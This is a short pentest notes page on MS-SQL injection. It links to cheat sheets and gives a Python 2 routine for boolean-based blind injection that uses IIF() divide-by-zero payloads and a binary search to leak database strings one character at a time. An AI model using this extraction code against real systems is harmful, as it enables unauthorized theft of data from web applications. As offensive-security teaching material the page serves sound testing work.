# MS-SQL Injection

## Cheatsheets

* [https://www.perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://www.perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

## Error Based SQL Injection

[https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-\(mssql\).pdf](https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-%28mssql%29.pdf)

## Blind SQL Injection

### Boolean Based Blind

In the case of boolean based blind we can use the [IIF\(\)](https://docs.microsoft.com/en-us/sql/t-sql/functions/logical-functions-iif-transact-sql?view=sql-server-2017) function to extract data.  Say our injection point required an integer placed at a specific point such as:

```text
demo.asp?id=1
```

If we can't inject via stacked queries or other methods we can execute basic queries by utilizing the `IIF` Boolean result which is converted to an integer to guarantee execution.  This assumes a function `exploit` which returns a True or False response:

```python
def binary_search(payload):
	first = 0
	last = 127
	while first <= last:
		i = (first+last)/2
		eq = 'IIF({0}={1},1,1/0)'.format(payload,i)
		gt = 'IIF({0}<{1},1,1/0)'.format(payload,i)
		lt = 'IIF({0}>{1},1,1/0)'.format(payload,i)
		if exploit(eq) == True:
			return i
		elif exploit(gt) == True:
			last = i - 1
		elif exploit(lt) == True:
			first = i +1
		else:
			return 0

def leak_string(query, length=0):
	while True:
		payload = 'IIF(LEN({0})>{1},1,1/0)'.format(query, length)
        if exploit(payload) == False:
        	break
        length += 1
	print '[+] Length of {0}'.format(length)
	name = ''
	for i in range(1, length+1):
		print name
		name += chr(binary_search('ASCII(SUBSTRING({0},{1},1))'.format(query,i)))
	return name
```



